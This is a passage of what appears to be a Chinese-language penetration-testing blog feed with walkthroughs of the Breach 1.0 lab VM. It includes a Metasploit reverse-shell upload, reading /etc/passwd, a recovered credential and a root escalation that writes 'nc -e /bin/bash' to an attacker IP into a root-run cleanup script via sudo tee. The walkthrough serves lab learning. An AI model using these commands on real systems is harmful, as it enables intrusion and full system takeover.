alt="4KKJhj.png" /></a></p><p>看到文件上传的位置：</p><p><a href="https://imgtu.com/i/4KQWTO"><img src="https://z3.ax1x.com/2021/09/17/4KQWTO.png" alt="4KQWTO.png" /></a></p><p>使用msf生成一个反弹shell的马：</p><p><a href="https://imgtu.com/i/4KlsUS"><img src="https://z3.ax1x.com/2021/09/17/4KlsUS.png" alt="4KlsUS.png" /></a></p><p>同时开启监听：</p><p><a href="https://imgtu.com/i/4Kl4bV"><img src="https://z3.ax1x.com/2021/09/17/4Kl4bV.png" alt="4Kl4bV.png" /></a></p><p>将生成好的文件上传并且访问：</p><p><a href="https://imgtu.com/i/4K1VqP"><img src="https://z3.ax1x.com/2021/09/17/4K1VqP.png" alt="4K1VqP.png" /></a></p><p>回到msf看到shell:</p><p><a href="https://imgtu.com/i/4K1Gq0"><img src="https://z3.ax1x.com/2021/09/17/4K1Gq0.png" alt="4K1Gq0.png" /></a></p><p>尝试获取交互shell：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty;pty. spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure><p><a href="https://imgtu.com/i/4K80D1"><img src="https://z3.ax1x.com/2021/09/17/4K80D1.png" alt="4K80D1.png" /></a></p><p>看看内核版本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname -a 看到版本是Linux Breach 4.2.0-27-generic</span><br></pre></td></tr></table></figure><p>msf里看看有没有可以利用的漏洞。结果并没有</p><p>那就看看有没有什么敏感文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -a</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name </span><br></pre></td></tr></table></figure><p>读取到/etc/passwd文件：</p><p><a href="https://imgtu.com/i/4KJy1e"><img src="https://z3.ax1x.com/2021/09/17/4KJy1e.png" alt="4KJy1e.png" /></a></p><p>逐级查看目录，在www目录下看到两个文件，打开5446文件，莫名的php文件</p><p><a href="https://imgtu.com/i/4KtcdI"><img src="https://z3.ax1x.com/2021/09/17/4KtcdI.png" alt="4KtcdI.png" /></a></p><p>打开查看，是数据库的账号密码文件，账号是root,密码是空。</p><p><a href="https://imgtu.com/i/4Kt7es"><img src="https://z3.ax1x.com/2021/09/17/4Kt7es.png" alt="4Kt7es.png" /></a></p><p>连接数据库：</p><p><a href="https://imgtu.com/i/4KNZlD"><img src="https://z3.ax1x.com/2021/09/17/4KNZlD.png" alt="4KNZlD.png" /></a></p><p>在user表内找打了账号，密码信息：</p><p><a href="https://imgtu.com/i/4KN4tx"><img src="https://z3.ax1x.com/2021/09/17/4KN4tx.png" alt="4KN4tx.png" /></a></p><p>对milton的密码解密（哈希值）：</p><p><a href="https://imgtu.com/i/4KUsUI"><img src="https://z3.ax1x.com/2021/09/17/4KUsUI.png" alt="4KUsUI.png" /></a></p><p>切换用户：</p><p><a href="https://imgtu.com/i/4KaQRf"><img src="https://z3.ax1x.com/2021/09/17/4KaQRf.png" alt="4KaQRf.png" /></a></p><p>再重复之前的操作，查看文件，看看历史执行，看看能不能root执行什么，结果并没有。在历史命令里我们看到切换到了blubergh账号，但是我们并没有找到他的密码？</p><p>只能回过头去看，慢慢寻找。想起之前目录扫描时的图片目录，把所有的图片下载下来，strings 或者exiftool看看照片有没有注释。</p><p>[<img src="https://z3.ax1x.com/2021/09/17/4KDmCR.png" alt="4KDmCR.png" />](<a href="https://imgtu.com/i/4KDmCR">https://imgtu.com/i/4KDmCR</a></p><p>尝试切换，确实是密码，看看权限：</p><p><a href="https://imgtu.com/i/4KDwKf"><img src="https://z3.ax1x.com/2021/09/17/4KDwKf.png" alt="4KDwKf.png" /></a></p><p>两个文件能以root身份执行，其中tidyup是用来隔一段时间删除tomcat上传的文件用来防止黑客</p><p>另一个文件tee:</p><p><a href="https://imgtu.com/i/4Ky8VU"><img src="https://z3.ax1x.com/2021/09/17/4Ky8VU.png" alt="4Ky8VU.png" /></a></p><p>如此，我们可以利用第一个命令向第二个文件内写入一个定时任务，第二个文件每三分钟执行一次:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;nc -e /bin/bash 192.168.110.129 5555&quot; &gt; shell.txt</span><br><span class="line"></span><br><span class="line">cat shell.txt | sudo /usr/bin/tee /usr/share/cleanup/tidyup.sh</span><br></pre></td></tr></table></figure><p>随后我们在msf机器开启监听：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 5555</span><br></pre></td></tr></table></figure><p>等待一段时间：</p><p><a href="https://imgtu.com/i/4KgRz9"><img src="https://z3.ax1x.com/2021/09/17/4KgRz9.png" alt="4KgRz9.png" /></a></p><p><a href="https://imgtu.com/i/4K2iWQ"><img src="https://z3.ax1x.com/2021/09/17/4K2iWQ.png" alt="4K2iWQ.png" /></a></p><p>结束。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;紧接上一回，看看过滤后的记录，找到一条链接：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://imgtu.com/i/4KeOTH&quot;&gt;&lt;img src=&quot;https://z3.ax1x.com/2021/09/17/4KeOTH.png&quot; alt=&quot;4KeOTH.png&quot; </summary>
      
    
    
    
    
    <category term="breach 渗透测试" scheme="http://example.com/tags/breach-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>breach1靶场渗透</title>
    <link href="http://example.com/2021/09/17/breach1%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/"/>
    <id>http://example.com/2021/09/17/breach1%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/</id>
    <published>2021-09-16T16:25:49.000Z</published>
    <updated>2021-09-16T16:32:09.171Z</updated>
    
    <content type="html"><![CDATA[<h4 id="靶场搭建"><a class="markdownIt-Anchor" href="#靶场搭建"></a> 靶场搭建</h4><p>下载好breach1.0镜像文件后，创建虚拟机，注意要将虚拟机网段设置成仅主机模式。网段设置为192.168.110.0，虚拟机会默认将ip设置为192.168.110.140。</p><h4 id="测试"><a class="markdownIt-Anchor" href="#测试"></a> 测试：</h4><p>因为IP已知，首先对靶场进行端口扫描，借助nmap:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 1-65535 192.168.110.140</span><br></pre></td></tr></table></figure><p>扫描后看到结果，所有的端口都是打开状态，因此判断可能是采用了ips，或者waf防护<a href="https://imgtu.com/i/4uCzCD"><img src="https://z3.ax1x.com/2021/09/16/4uCzCD.png" alt="4uCzCD.png" /></a></p><p>尝试在浏览器中访问靶机IP，看到一些没啥用的信息（讲故事）</p><p><a href="https://imgtu.com/i/4uPYPU"><img src="https://z3.ax1x.com/2021/09/16/4uPYPU.png" alt="4uPYPU.png" /></a></p><p>尝试看看源码？也就这样了。看到一段加密过的值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!------Y0dkcFltSnZibk02WkdGdGJtbDBabVZsYkNSbmIyOWtkRzlpWldGbllXNW5KSFJo -----&gt;</span><br></pre></td></tr></table></figure><p><a href="https://imgtu.com/i/4uPWMd"><img src="https://z3.ax1x.com/2021/09/16/4uPWMd.png" alt="4uPWMd.png" /></a></p><p>这段值是64位，根据常见的加密算法的特征，猜测是base64加密。 （md5:32位，sha1：40位）尝试用自动解码工具解码看看，果然是base64，但还是看不懂，难道加了盐？再试一次，能看懂了。</p><p><a href="https://imgtu.com/i/4uihpF"><img src="https://z3.ax1x.com/2021/09/16/4uihpF.png" alt="4uihpF.png" /></a></p><p><a href="https://imgtu.com/i/4uiqk6"><img src="https://z3.ax1x.com/2021/09/16/4uiqk6.png" alt="4uiqk6.png" /></a></p><p>解码出现：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pgibbons:damnitfeel$goodtobeagang$ta</span><br></pre></td></tr></table></figure><p>猜测是某个用户账号密码</p><p>回到原来的初始页面，点击图片，进入一个类似导航的页面：</p><p><a href="https://imgtu.com/i/4uZLtI"><img src="https://z3.ax1x.com/2021/09/16/4uZLtI.png" alt="4uZLtI.png" /></a></p><p>依次点点看 ，再最后一个链接，进入了一个后台直接看到是什么cms ，后面可以查询看看这个impress cms 有没有什么漏洞</p><p><a href="https://imgtu.com/i/4ue141"><img src="https://z3.ax1x.com/2021/09/16/4ue141.png" alt="4ue141.png" /></a></p><p>用之前的密码试试看？果然进入：</p><p><a href="https://imgtu.com/i/4ueo80"><img src="https://z3.ax1x.com/2021/09/16/4ueo80.png" alt="4ueo80.png" /></a></p><p>先看看cms是不是有什么漏洞。msf打开：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit  impresscms</span><br></pre></td></tr></table></figure><p>有是有就是不知道这里具体的版本：</p><p><a href="https://imgtu.com/i/4umIdH"><img src="https://z3.ax1x.com/2021/09/16/4umIdH.png" alt="4umIdH.png" /></a></p><p>依次尝试，并不行。。。</p><p>继续看看页面上有啥，这里有三个未读邮件，进去看看</p><p><a href="https://imgtu.com/i/4unAyT"><img src="https://z3.ax1x.com/2021/09/16/4unAyT.png" alt="4unAyT.png" /></a></p><p>第三封邮件有信息，在 192.168.110.140/.keystore 位置保存了文件</p><p><a href="https://imgtu.com/i/4unY0e"><img src="https://z3.ax1x.com/2021/09/16/4unY0e.png" alt="4unY0e.png" /></a></p><p>keystore是keytool（jdk里自带）生成的密钥、证书存储的地方，这里有什么关键的信息？可以用keytool提取java里的密钥、证书。不管别的，先下载这个keystore。但是没有密钥口令也没法解开。</p><p>继续寻找密钥，点点点，在View Account内有个一content链接打开看看？</p><p><a href="https://imgtu.com/i/4uu7xP"><img src="https://z3.ax1x.com/2021/09/16/4uu7xP.png" alt="4uu7xP.png" /></a></p><p><a href="https://imgtu.com/i/4uuzPs"><img src="https://z3.ax1x.com/2021/09/16/4uuzPs.png" alt="4uuzPs.png" /></a></p><p>看看提示，有个文件： <a href="http://192.168.110.140/impresscms/_SSL_test_phase1.pcap%E3%80%82pcap%E6%96%87%E4%BB%B6%EF%BC%9F%E4%BB%80%E4%B9%88%E7%8E%A9%E6%84%8F%EF%BC%9F%E6%90%9C%E6%90%9C%E7%9C%8B%EF%BC%8C%E5%8E%9F%E6%9D%A5%E6%98%AFwireshark%E7%9A%84%E6%B5%81%E9%87%8F%E5%8C%85%EF%BC%8C%E4%B8%8B%E4%BA%86%E5%86%8D%E8%AF%B4%E3%80%82%E7%BB%A7%E7%BB%AD%E7%9C%8B%EF%BC%8C%E7%94%9F%E6%88%90keystore%E9%9C%80%E8%A6%81%E7%9A%84%E5%88%AB%E5%90%8D%EF%BC%8C%E5%AF%86%E9%92%A5%E9%83%BD%E6%98%AF%E2%80%9Ctomcat%E2%80%9D%E3%80%82%E5%9C%A8%E4%B8%8B%E8%BD%BDkeystore%E7%9A%84%E7%9B%AE%E5%BD%95%E4%B8%8B%EF%BC%8C%E4%BD%BF%E7%94%A8keytool%E7%94%9F%E6%88%90%E8%AF%81%E4%B9%A6%EF%BC%9A">http://192.168.110.140/impresscms/_SSL_test_phase1.pcap。pcap文件？什么玩意？搜搜看，原来是wireshark的流量包，下了再说。继续看，生成keystore需要的别名，密钥都是“tomcat”。在下载keystore的目录下，使用keytool生成证书：</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keytool -importkeystore -srckeystore E:\Download\keystore -destkeystore E:\Download\\tomcat.p12 -deststoretype PKCS12 -srcalias tomcat</span><br></pre></td></tr></table></figure><p>密钥库口令就是tomcat。可以看到tomcat.p12证书生成。</p><p>打开SSL_test_phase1.pcap文件，https协议，用了TSL加密，因此导入刚刚生成的证书来解密。</p><p>编辑–&gt;首选项–&gt;Protocols–&gt;TLS–&gt;edit</p><p><a href="https://imgtu.com/i/4ulPMt"><img src="https://z3.ax1x.com/2021/09/17/4ulPMt.png" alt="4ulPMt.png" /></a></p><p>回到wireshark主页面，过滤一下信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip.src == 192.168.110.140 || ip.dst == 192.168.110.140 and http</span><br></pre></td></tr></table></figure><p><a href="https://imgtu.com/i/4ulGoF"><img src="https://z3.ax1x.com/2021/09/17/4ulGoF.png" alt="4ulGoF.png" /></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;靶场搭建&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#靶场搭建&quot;&gt;&lt;/a&gt; 靶场搭建&lt;/h4&gt;
&lt;p&gt;下载好breach1.0镜像文件后，创建虚拟机，注意要将虚拟机网段设置成仅主机模式。网段设置为192.168.110.0，虚拟机会默</summary>
      
    
    
    
    
    <category term="breach1.0 渗透测试" scheme="http://example.com/tags/breach1-0-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>myfirstblog</title>
    <link href="http://example.com/2021/09/15/myfirstblog/"/>
    <id>http://example.com/2021/09/15/myfirstblog/</id>
    <published>2021-09-15T12:00:35.000Z</published>
    <updated>2021-09-16T16:21:24.360Z</updated>
    
    <content type="html"><![CDATA[<p>我的博客，分享渗透测试学习的点点滴滴</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;我的博客，分享渗透测试学习的点点滴滴&lt;/p&gt;
</summary>
      
    
    
    
    
  </entry>
  
</feed>
